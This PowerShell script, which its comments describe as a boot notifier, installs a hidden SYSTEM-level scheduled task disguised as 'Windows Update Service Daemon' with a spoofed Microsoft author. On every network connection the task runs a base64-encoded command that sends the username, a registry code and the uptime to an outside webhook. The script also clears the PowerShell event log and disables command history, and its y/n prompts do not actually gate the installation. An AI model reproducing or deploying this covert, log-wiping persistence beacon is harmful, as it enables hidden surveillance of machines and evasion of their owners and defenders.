#This script creates a schedule task that will run everytime the system is booted up.
#Purpose of this scirpt to get notified once a system comes online.
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$pingdaemontask = "Windows Update Service Daemon"

## Command to be encodded.
<#

$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$regPath = "HKLM:\Software\WindowsUpdateService"
$code = (Get-ItemProperty -Path $regPath).Code
$uptime = (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime
$currentTime = Get-Date
$elapsedTime = $currentTime - $uptime
$elapsedTimeFormatted = "{0:D2} days, {1:D2} hours, {2:D2} minutes" -f $elapsedTime.Days, $elapsedTime.Hours, $elapsedTime.Minutes, $elapsedTime.Seconds
$username= ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
$message = "**$code** :: **$username** :: **$elapsedTimeFormatted**"
Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null
'@

#>
#Convert from https://www.base64encode.org/

#Purge of Ping Task
$Name = "Deleteing the Ping Task and Related Files"
$prompt = Read-Host "Proceed With $Name (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
  Start-Sleep -Seconds 1
  $pwdst = "n"
}
if ($prompt.ToLower() -eq "y") {
  if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false -ErrorAction SilentlyContinue
  }
} else {}

#Creation of the setup
$Name = "Creating a schedule task for Pinging"
$prompt = Read-Host "Proceed With $Name (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
  Start-Sleep -Seconds 1
  $pwdst = "n"

#Create Windows Scheduled task
$pingdaemonxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-15T12:03:06.3532289</Date>
    <Author>Microsoft\System</Author>
    <URI>\Windows Update Service Daemon</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JGFwaXVybCA9ICJodHRwczovL2hvb2suZXUyLm1ha2UuY29tL3Bndmo5a3h0d280cGNyaHh3bjFrZzlwOWFncDEyOWJsIgokQXZhaWxhYmxlVGxzID0gW2VudW1dOjpHZXRWYWx1ZXMoJ05ldC5TZWN1cml0eVByb3RvY29sVHlwZScpIHwgV2hlcmUtT2JqZWN0IHsgJF8gLWdlICdUbHMxMicgfQpmb3JlYWNoICgkdGxzUHJvdG9jb2wgaW4gJEF2YWlsYWJsZVRscykge1tOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sIC1ib3IgJHRsc1Byb3RvY29sfQpTZXQtUFNSZWFkTGluZU9wdGlvbiAtSGlzdG9yeVNhdmVTdHlsZSBTYXZlTm90aGluZyB8IE91dC1OdWxsCkNsZWFyLUV2ZW50TG9nICJXaW5kb3dzIFBvd2Vyc2hlbGwiCiRMb2dFbmdpbmVMaWZlY3ljbGVFdmVudCA9ICRmYWxzZSB8IE91dC1OdWxsClt2b2lkXSRMb2dFbmdpbmVMaWZlY3ljbGVFdmVudAokcmVnUGF0aCA9ICJIS0xNOlxTb2Z0d2FyZVxXaW5kb3dzVXBkYXRlU2VydmljZSIKJGNvZGUgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnUGF0aCkuQ29kZQokdXB0aW1lID0gKEdldC1DaW1JbnN0YW5jZSAtQ2xhc3NOYW1lIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuTGFzdEJvb3RVcFRpbWUKJGN1cnJlbnRUaW1lID0gR2V0LURhdGUKJGVsYXBzZWRUaW1lID0gJGN1cnJlbnRUaW1lIC0gJHVwdGltZQokZWxhcHNlZFRpbWVGb3JtYXR0ZWQgPSAiezA6RDJ9IGRheXMsIHsxOkQyfSBob3VycywgezI6RDJ9IG1pbnV0ZXMiIC1mICRlbGFwc2VkVGltZS5EYXlzLCAkZWxhcHNlZFRpbWUuSG91cnMsICRlbGFwc2VkVGltZS5NaW51dGVzLCAkZWxhcHNlZFRpbWUuU2Vjb25kcwokdXNlcm5hbWU9ICggKCBHZXQtQ0lNSW5zdGFuY2UgLWNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgdXNlcm5hbWUgKSAtc3BsaXQgJ1xcJyApWzFdCiRtZXNzYWdlID0gIioqJGNvZGUqKiA6OiAqKiR1c2VybmFtZSoqIDo6ICoqJGVsYXBzZWRUaW1lRm9ybWF0dGVkKioiCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJGFwaXVybCAtTWV0aG9kIFBvc3QgLUNvbnRlbnRUeXBlICJ0ZXh0L3BsYWluIiAtQm9keSAkbWVzc2FnZSAtVXNlQmFzaWNQYXJzaW5nIHwgT3V0LU51bGw</Arguments>
    </Exec>
  </Actions>
</Task>
"@
  # Register the task from the XML content
  if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false -ErrorAction SilentlyContinue
  }
  else {}
  Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
  Start-ScheduledTask -TaskName $pingdaemontask
}else {}
